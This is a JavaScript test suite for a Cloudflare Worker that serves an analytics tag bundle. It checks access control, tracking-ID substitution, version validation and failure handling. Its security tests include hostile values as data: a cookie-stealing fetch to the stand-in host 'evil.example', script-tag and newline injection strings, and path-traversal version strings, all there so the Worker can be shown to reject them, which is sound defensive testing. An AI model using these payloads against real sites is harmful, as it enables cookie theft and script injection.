// Checks for the self-hosted loader Worker (self-hosted/src/index.js): the
// access-control decisions, and the one place it rewrites the bundle it serves
// (patching in the client's tracking ID from their KV record).
//
// The Worker is exercised directly with a stubbed env, and the bytes it
// returns for a real client are then run through the browser harness, so the
// substitution is verified by the tag actually reading it rather than by
// matching on the served source.
//
// Usage: node test/loader.test.js
'use strict';

var fs = require('fs');
var path = require('path');
var runTag = require('./harness').runTag;

var PUBLIC_DIR = path.join(__dirname, '..', 'self-hosted', 'public');
// Only a label for stack traces; the source actually run is the Worker's output.
var SERVED_LABEL = 'served-by-loader.js';
var BUNDLE_VERSION = '2.6.2';
var ORIGIN = 'https://tag.conversio.dev';
var KEY = 'cvo_0123456789abcdefghij';

var pass = 0;
var fail = 0;

function check(name, cond, detail) {
  if (cond) { pass++; }
  else {
    fail++;
    console.log('  FAIL  ' + name + (detail ? '  -> ' + detail : ''));
  }
}

// Stands in for the Cloudflare bindings the Worker expects. ASSETS serves the
// real files in self-hosted/public, so what comes back is what a client gets.
function makeEnv(record, opts) {
  opts = opts || {};
  return {
    CLIENT_KEYS: {
      get: function () {
        if (opts.kvThrows) return Promise.reject(new Error('KV internal error'));
        if (opts.kvBadJson) return Promise.reject(new SyntaxError('Unexpected token'));
        return Promise.resolve(record);
      }
    },
    ASSETS: {
      fetch: function (request) {
        if (opts.assetsThrow) return Promise.reject(new Error('asset fetch failed'));
        var name = new URL(request.url).pathname.replace(/^\//, '');
        var file = path.join(PUBLIC_DIR, name);
        if (!fs.existsSync(file)) return Promise.resolve(new Response('missing', { status: 404 }));
        return Promise.resolve(new Response(fs.readFileSync(file, 'utf8'), { status: 200 }));
      }
    },
    RATE_LIMITER: opts.rateLimiterThrows
      ? { limit: function () { return Promise.reject(new Error('rate limiter down')); } }
      : opts.rateLimited
        ? { limit: function () { return Promise.resolve({ success: false }); } }
        : null
  };
}

function get(loader, record, opts) {
  opts = opts || {};
  var headers = {};
  if (opts.referer) headers.Referer = opts.referer;
  var url = ORIGIN + (opts.path || ('/t/' + KEY + '.js'));
  return loader.fetch(new Request(url, { headers: headers, method: opts.method || 'GET' }),
    makeEnv(record, opts));
}

function activeRecord(extra) {
  return Object.assign({ status: 'active', client: 'Acme Co', version: BUNDLE_VERSION }, extra || {});
}

async function main() {
  var loader = (await import('../self-hosted/src/index.js')).default;

  // 1. a client with a tracking ID gets it patched into the bundle, and the
  //    tag reads it back off window.conversioSettings
  var res = await get(loader, activeRecord({ trackingId: 'G-J4EDMZMNY9' }));
  var body = await res.text();
  check('serves the bundle', res.status === 200 && body.indexOf('CONVERSIO TAG') !== -1,
    'status ' + res.status);
  check('placeholder is gone from the served bytes',
    body.indexOf('@@CONVERSIO_TRACKING_ID@@') === -1, 'placeholder still present');

  var r = runTag({ tagPath: SERVED_LABEL, tagSource: body, cwv: 'ok', emissionEnabled: true });
  check('tag reads the injected tracking ID',
    r.window.conversioSettings.trackingId === 'G-J4EDMZMNY9',
    JSON.stringify(r.window.conversioSettings));

  // 2. a client with no tracking ID still gets a substituted slot, never the
  //    raw placeholder, and reads as not configured
  var noneRes = await get(loader, activeRecord());
  var noneBody = await noneRes.text();
  check('no tracking ID: placeholder still substituted',
    noneBody.indexOf('@@CONVERSIO_TRACKING_ID@@') === -1, 'placeholder still present');

  var noneRun = runTag({ tagPath: SERVED_LABEL, tagSource: noneBody, cwv: 'ok', emissionEnabled: true });
  check('no tracking ID: tag reads null',
    noneRun.window.conversioSettings.trackingId === null,
    JSON.stringify(noneRun.window.conversioSettings));

  // 3. the security boundary: a record edited straight into KV never passed
  //    through the CLI's validation, and this value lands inside a JS string
  //    literal that runs on every page of the client's site
  var hostile = [
    "' ; fetch('//evil.example/'+document.cookie) ; '",
    "'+document.cookie+'",
    'G-OK</script><script>alert(1)</script>',
    'G-OK\n; alert(1)',
    // Non-strings too, which would otherwise be coerced by the regex test.
    12345,
    { toString: function () { return 'G-COERCED'; } }
  ];
  var i;
  for (i = 0; i < hostile.length; i++) {
    var hRes = await get(loader, activeRecord({ trackingId: hostile[i] }));
    var hBody = await hRes.text();
    check('hostile trackingId #' + (i + 1) + ' is not injected',
      hBody.indexOf(hostile[i]) === -1, 'hostile value reached the served bytes');
    check('hostile trackingId #' + (i + 1) + ' leaves a usable tag',
      hBody.indexOf('@@CONVERSIO_TRACKING_ID@@') === -1 &&
      runTag({ tagPath: SERVED_LABEL, tagSource: hBody, cwv: 'ok', emissionEnabled: true })
        .window.conversioSettings.trackingId === null,
      'tag did not fall back to not-configured');
  }

  // 4. a valid ID that is not GA-shaped is still safe to inject, so the Worker
  //    lets it through: shape is the CLI's job, safety is the Worker's
  var otherRes = await get(loader, activeRecord({ trackingId: 'internal_id-42' }));
  var otherBody = await otherRes.text();
  check('non-GA but safe ID is passed through',
    runTag({ tagPath: SERVED_LABEL, tagSource: otherBody, cwv: 'ok', emissionEnabled: true })
      .window.conversioSettings.trackingId === 'internal_id-42', 'was dropped');

  // 5. access control, unchanged by any of the above
  var revoked = await get(loader, activeRecord({ status: 'revoked', trackingId: 'G-J4EDMZMNY9' }));
  var revokedBody = await revoked.text();
  check('revoked key serves no bundle', revokedBody.indexOf('CONVERSIO TAG') === -1, revokedBody.trim());
  check('revoked key leaks no tracking ID', revokedBody.indexOf('G-J4EDMZMNY9') === -1, revokedBody.trim());

  var unknown = await get(loader, null);
  check('unknown key serves no bundle',
    (await unknown.text()).indexOf('CONVERSIO TAG') === -1, 'served a bundle');

  var mismatch = await get(loader, activeRecord({ domains: ['acme.com'] }), { referer: 'https://not-acme.com/x' });
  check('domain mismatch serves no bundle',
    (await mismatch.text()).indexOf('CONVERSIO TAG') === -1, 'served a bundle');

  var allowed = await get(loader, activeRecord({ domains: ['acme.com'], trackingId: 'G-J4EDMZMNY9' }),
    { referer: 'https://www.acme.com/x' });
  check('allowed subdomain serves the bundle',
    (await allowed.text()).indexOf('CONVERSIO TAG') !== -1, 'did not serve');

  var limited = await get(loader, activeRecord(), { rateLimited: true });
  check('rate limited key gets 429', limited.status === 429, 'status ' + limited.status);

  var notFound = await get(loader, activeRecord(), { path: '/nope.js' });
  check('unmatched path is 404', notFound.status === 404, 'status ' + notFound.status);

  // 6. a client pinned to a pre-2.4 bundle has no slot to substitute, and must
  //    still be served normally
  var oldRes = await get(loader, activeRecord({ version: '2.3' }));
  var oldBody = await oldRes.text();
  check('older bundle version still serves',
    oldRes.status === 200 && oldBody.indexOf('version 2.3') !== -1, 'status ' + oldRes.status);


  // 7. The hardening that 'pre-launch-fixes' adds. Every case here must come
  //    back as JavaScript: the whole point is that nothing this Worker depends
  //    on can put an HTML error page into a client's <script> tag.
  function isJs(res) {
    return (res.headers.get('content-type') || '').indexOf('javascript') !== -1;
  }

  // The live defect. A POST to a real key used to return 200 with the inactive
  // stub, because new Request(assetUrl, request) copied the method onto the
  // subrequest and the assets binding refused it.
  var posted = await get(loader, activeRecord(), { method: 'POST' });
  check('a POST is 405, not the inactive stub', posted.status === 405, 'status ' + posted.status);
  check('and says which methods are allowed',
    (posted.headers.get('allow') || '').indexOf('GET') !== -1, posted.headers.get('allow'));
  check('and is still JavaScript, so a stray POST cannot inject HTML', isJs(posted));

  var headed = await get(loader, activeRecord(), { method: 'HEAD' });
  check('a HEAD still succeeds, uptime checks using it keep working',
    headed.status === 200, 'status ' + headed.status);

  var putted = await get(loader, activeRecord(), { method: 'PUT', path: '/nope.js' });
  check('an unmatched path is still 404 whatever the method',
    putted.status === 404, 'status ' + putted.status);

  // DEFAULT_VERSION is gone, so a record that forgot its version is surfaced
  // rather than being served a 2.2 bundle that reports nothing.
  var noVersion = await get(loader, { status: 'active', client: 'Acme Co' });
  var noVersionBody = await noVersion.text();
  check('a record with no version serves no bundle',
    noVersionBody.indexOf('CONVERSIO TAG') === -1, noVersionBody.trim());
  check('and does not fall back to 2.2',
    noVersionBody.indexOf('version 2.2') === -1);

  // The version reaches a URL, so it is validated rather than trusted.
  var badVersions = ['../secrets', '2.6.3/../..', 'latest', '', '2', 'a.b.c', '2.6.3;rm'];
  for (i = 0; i < badVersions.length; i++) {
    var bv = await get(loader, activeRecord({ version: badVersions[i] }));
    var bvBody = await bv.text();
    check('an unsafe version (' + JSON.stringify(badVersions[i]) + ') serves no bundle',
      bvBody.indexOf('CONVERSIO TAG') === -1 && isJs(bv), bvBody.trim().slice(0, 60));
  }

  // Binding failures. Before this change each of these threw out of fetch(),
  // which Cloudflare turns into a 1101 HTML error page.
  var kvDown = await get(loader, activeRecord(), { kvThrows: true });
  check('KV unavailable serves a harmless script, not a 500',
    kvDown.status === 200 && isJs(kvDown), 'status ' + kvDown.status);
  check('and is not cached, so the next page load re-decides',
    (kvDown.headers.get('cache-control') || '').indexOf('no-store') !== -1,
    kvDown.headers.get('cache-control'));

  var kvJunk = await get(loader, activeRecord(), { kvBadJson: true });
  check('a record holding malformed JSON serves a harmless script',
    kvJunk.status === 200 && isJs(kvJunk), 'status ' + kvJunk.status);

  var assetsDown = await get(loader, activeRecord(), { assetsThrow: true });
  check('the assets binding throwing serves a harmless script',
    assetsDown.status === 200 && isJs(assetsDown), 'status ' + assetsDown.status);

  // The limiter is a cost cap, not a dependency of delivery, so it fails open.
  var rlDown = await get(loader, activeRecord({ trackingId: 'G-J4EDMZMNY9' }), { rateLimiterThrows: true });
  var rlBody = await rlDown.text();
  check('a broken rate limiter fails open and still serves the bundle',
    rlBody.indexOf('CONVERSIO TAG') !== -1, rlBody.trim().slice(0, 60));

  // A record that parsed but is not an object.
  var strRecord = await get(loader, 'active');
  check('a record that is a bare string serves no bundle',
    (await strRecord.text()).indexOf('CONVERSIO TAG') === -1);

  // The key is a bearer credential and must not be logged whole.
  var logged = [];
  var realLog = console.log;
  console.log = function (line) { logged.push(String(line)); };
  try {
    await get(loader, null);
    await get(loader, activeRecord({ status: 'revoked' }));
    await get(loader, activeRecord(), { rateLimited: true });
  } finally {
    console.log = realLog;
  }
  check('logs carry a truncated key, never the whole one',
    logged.length > 0 && logged.every(function (l) { return l.indexOf(KEY) === -1; }),
    logged.join(' | '));
  check('and still carry enough of it to identify the client',
    logged.every(function (l) { return l.indexOf(KEY.slice(0, 12)) !== -1; }),
    logged.join(' | '));

  console.log('\nself-hosted/src/index.js: ' + pass + ' passed, ' + fail + ' failed\n');
  process.exit(fail ? 1 : 0);
}

main().catch(function (e) {
  console.log('  FAIL  suite threw  -> ' + (e && e.stack ? e.stack : e));
  process.exit(1);
});
